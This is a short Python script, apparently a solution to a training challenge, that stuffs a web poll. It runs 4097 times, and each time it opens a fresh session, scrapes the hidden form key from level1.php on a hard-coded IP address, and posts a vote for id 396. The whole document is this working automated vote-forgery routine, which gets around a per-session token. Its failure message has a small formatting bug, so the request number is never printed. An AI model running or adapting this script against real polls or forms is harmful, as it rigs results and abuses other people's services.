#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

payload = {'id': '396', 'holdthedoor': 'submit', 'key': ''}

for x in range(0, 4097):
    session = requests.session()
    hodor = session.get("http://158.69.76.135/level1.php")
    soup = BeautifulSoup(hodor.text, "html.parser")  # create a soup object

    key = soup.find("form", {"method": "post"})  # find the form
    key = key.find("input", {"type": "hidden"})  # find the input
    payload["key"] = key["value"]  # find the key then set it to payload

    r = session.post('http://158.69.76.135/level1.php', data=payload)
    if r.status_code != 200:  # checks if posted
        print("request #(x) has failed".format(x))
